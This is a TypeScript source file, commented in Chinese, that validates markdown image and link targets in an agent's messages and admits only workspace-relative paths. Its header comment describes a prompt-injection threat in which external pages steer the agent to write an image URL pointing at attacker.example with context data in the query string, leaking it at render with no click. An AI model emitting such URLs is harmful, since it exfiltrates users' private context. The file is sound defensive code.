/**
 * 消息正文里的 `![](target)` / `[](target)`，哪些 target 允许当工作区文件用。
 *
 * ## 为什么这是安全判据而不是格式问题
 *
 * 这里解析的是 **agent 写出来的文本**，而 agent 读过外部论文和网页 —— 那些内容
 * 里可能带着冲它去的指令。一旦允许任意 URL 当图片源：
 *
 *     ![](https://attacker.example/p.png?d=<把上下文里的东西拼进来>)
 *
 * **渲染那一刻请求就发出去了，用户不需要点任何东西**。这不是"用户可能被骗"，
 * 是零点击外泄。所以图片源只允许工作区相对路径，由平台自己的鉴权端点取回。
 *
 * 判据写成"只放行明确安全的形状"，不是"拦掉已知危险的写法" —— 后者是名单式
 * 护栏，新写法默认漏过（`//host/x.png` 这种协议相对 URL 就是最容易漏的一个：
 * 它不含 `http`，看起来像路径，浏览器却会当成外部地址去拉）。
 */

/** 有 scheme 的一律不是工作区路径：http/https/data/javascript/file/mailto… */
const HAS_SCHEME = /^[a-zA-Z][a-zA-Z0-9+.\-]*:/;

/**
 * 把消息里的 target 归一成一个工作区相对路径；不合格返回 null。
 *
 * 返回 null 的调用方一律**退回成普通文本**，不画裂图、不画死链 —— 那比一个
 * 点不动的元素诚实。
 */
export function workspaceTargetOf(raw: string): string | null {
  const value = (raw ?? "").trim();
  if (!value) return null;

  // 换行 / 控制字符：不可能是路径，而且会把后面的判据带偏。
  if (/[\u0000-\u001f\u007f]/.test(value)) return null;

  // ⚠️ 下面几条**故意重叠**：`//host/x` 同时被"协议相对""绝对路径""空路径段"
  // 三条拦住。所以单独删掉其中任何一条，测试都不会红 —— 那不是测试没写好
  // （断言的是行为，行为确实没变），是这里有意留的余量。
  //
  // 记在这里是因为下一个人会看到"删了也不红"，然后把三条都当冗余清掉。
  // 每一条命名的是一种**不同的危险形状**，值得各自留着。
  if (HAS_SCHEME.test(value)) return null;
  // `//host/x.png` —— 协议相对 URL。浏览器按外部地址解析，肉眼却像路径。
  if (value.startsWith("//")) return null;
  // 绝对路径：既可能是别人机器上的路径，也不该由消息正文指定。
  if (value.startsWith("/")) return null;
  // 反斜杠一律不收：Windows 风格的分隔符在这里只会是绕过尝试。
  if (value.includes("\\")) return null;
  // 锚点 / 查询串不属于文件路径。
  if (value.includes("#") || value.includes("?")) return null;

  // 目录引用（`paper/figures/`）：尾部斜杠不是一段路径，去掉一个；再多的空段下面照拦。
  const normalized = value.replace(/^\.\//, "").replace(/\/$/, "");
  if (!normalized || normalized === "." || normalized === "..") return null;

  const parts = normalized.split("/");
  // `..` 任意一段都不收。服务端还有一道 resolve 之后的归属检查（那才是真正
  // 的墙），这里挡住的是"根本不该发出去的请求"。
  if (parts.some((part) => part === ".." || part === "")) return null;
  // `.git` 与平台记账目录：服务端也拒，这里不必让它走一趟。
  if (parts[0] === ".git") return null;

  return normalized;
}

/**
 * 这个路径看起来像图吗 —— 只用来决定"要不要按图去取"。
 *
 * ⚠️ 真正的类型由**服务端返回的 Content-Type** 决定（见 preview-mode.ts 的
 * 文件头）。这里是取之前的一次筛选，不是判决：扩展名说是图、服务端说不是，
 * 以服务端为准。
 */
const IMAGE_SUFFIX = /\.(png|jpe?g|gif|webp|avif|bmp|svg)$/i;

export function looksLikeImagePath(path: string): boolean {
  return IMAGE_SUFFIX.test(path);
}
